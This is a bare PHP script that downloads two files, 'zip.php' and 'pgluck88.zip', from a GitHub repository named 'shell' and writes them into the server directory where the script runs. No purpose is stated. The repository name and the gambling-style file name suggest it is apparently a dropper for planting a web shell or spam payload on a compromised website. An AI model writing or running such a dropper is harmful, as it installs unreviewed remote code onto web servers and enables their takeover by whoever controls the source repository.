<?php

$directory = __DIR__;
$repoBase  = "https://raw.githubusercontent.com/roiheeseo/shell/main/";
$files = [
    "zip.php",
    "pgluck88.zip"
];

function downloadFile($url, $savePath)
{
    // Try cURL first
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = fopen($savePath, 'w');

        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_FAILONERROR, true);

        $result = curl_exec($ch);

        if ($result === false) {
            fclose($fp);
            curl_close($ch);
            unlink($savePath);
            return false;
        }

        curl_close($ch);
        fclose($fp);
        return true;
    }

    // Fallback (old PHP)
    $data = @file_get_contents($url);
    if ($data === false) {
        return false;
    }

    file_put_contents($savePath, $data);
    return true;
}

foreach ($files as $file) {

    $url = $repoBase . $file;
    $destination = $directory . '/' . $file;

    echo "Downloading: $url\n";

    if (downloadFile($url, $destination)) {
        echo "✅ Success: $file\n";
    } else {
        echo "❌ Failed: $file\n";
    }
}

echo "Done\n";